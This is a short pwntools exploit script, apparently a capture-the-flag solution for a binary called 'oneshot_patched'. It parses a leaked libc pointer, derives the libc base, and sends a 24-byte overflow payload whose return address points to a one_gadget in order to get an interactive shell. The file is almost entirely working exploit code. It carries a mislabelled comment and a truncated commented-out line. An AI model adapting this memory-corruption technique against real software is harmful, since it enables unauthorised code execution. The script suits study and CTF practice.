from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './oneshot_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.arch = elf.arch

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
libc = ELF('./libc.so.6')
#context.log_level = 'debug'
#p = process('./oneshot')
#p = remote('
p.recvuntil(b'stdout: ')
leak = p.recvuntil(b'\n').decode('utf-8')
info('leak: ' + leak)
libc.address = int(leak, 16) - libc.symbols['_IO_2_1_stdout_']
info('libc.address: ' + hex(libc.address))
one_gadget = libc.address + 0x45216
payload = b'A' * 24
payload += p64(0)
payload += p64(0xdeadbeef)
payload += p64(one_gadget)
p.sendline(payload)
p.interactive()